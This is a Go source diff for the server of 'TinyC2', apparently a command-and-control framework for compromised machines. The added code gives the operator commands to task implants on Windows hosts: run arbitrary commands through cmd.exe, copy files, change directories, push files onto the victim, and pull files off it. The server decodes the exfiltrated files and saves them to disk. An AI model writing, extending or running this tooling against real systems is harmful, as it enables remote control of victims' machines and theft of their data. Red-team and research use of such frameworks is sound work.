@@ -4,6 +4,9 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"os"
+	"path/filepath"
+	"strings"
 	"time"
 
 	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"
@@ -86,12 +89,65 @@ type ProcessInfo struct {
 	PPid    uint32 `json:"ppid"`
 }
 
+type FileInfo struct {
+	Name string `json:"name"`
+	Size uint32 `json:"size"`
+	Data string `json:"data"`
+}
+
 func (e *Engine) ImplantTaskHandler(id uint32, task map[string]any) error {
 	implant, _ := e.Implants[id]
 	implant.Seen = time.Now()
 	e.Implants[id] = implant
 
+	if task["output"] != nil {
+		logger.Success("received output:\n%s\n", task["output"])
+	}
+
+	// post command processing
 	switch task["name"] {
+	case "download":
+		var file FileInfo
+
+		if task["artifact"] == nil {
+			return nil
+		}
+
+		err := json.Unmarshal([]byte(task["artifact"].(string)), &file)
+		if err != nil {
+			logger.Error("Error occurred during unmarshaling: %v", err)
+			return nil
+		}
+
+		data, err := base64.StdEncoding.DecodeString(file.Data)
+		if err != nil {
+			logger.Error("Failed to decode base64: %v", err)
+			return nil
+		}
+
+		err = os.MkdirAll("uploads", 0755)
+		if err != nil {
+			logger.Error("Failed to create directory: %v", err)
+			return nil
+		}
+
+		var filename string
+		slshindex := strings.LastIndex(file.Name, `\`)
+		if slshindex == -1 {
+			filename = file.Name
+		} else {
+			filename = file.Name[slshindex+1:]
+		}
+
+		dest := filepath.Join(
+			"uploads",
+			filename,
+		)
+		err = os.WriteFile(dest, data, 0644)
+		if err != nil {
+			logger.Error("Failed to write to file: %v", err)
+			return nil
+		}
 	case "ps":
 		var pslist []ProcessInfo
 		err := json.Unmarshal([]byte(task["artifact"].(string)), &pslist)
@@ -374,6 +430,72 @@ func (e *Engine) ImplantPs(id uint32) error {
 	e.ImplantTaskExecute(id, map[string]any{
 		"name":     "ps",
 		"args":     nil,
+		"artifact": nil,
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantCd(id uint32, directory string) error {
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "cd",
+		"args":     []string{directory},
+		"artifact": nil,
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantCp(id uint32, src string, dest string) error {
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "cp",
+		"args":     []string{src, dest},
+		"artifact": nil,
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantShell(id uint32, command string) error {
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "shell",
+		"args":     []string{"C:\\Windows\\System32\\cmd.exe /c " + command},
+		"artifact": nil,
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantDownload(id uint32, path string) error {
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "download",
+		"args":     []string{path},
+		"artifact": nil,
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantUpload(id uint32, src string, dest string) error {
+	data, err := os.ReadFile(src)
+	if err != nil {
+		logger.Error("failed to read file: %v", err)
+		return err
+	}
+
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "upload",
+		"args":     []string{dest},
+		"artifact": base64.StdEncoding.EncodeToString(data),
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantRun(id uint32, commandline string) error {
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "run",
+		"args":     []string{commandline},
 		"artifact": nil,
 	})
 
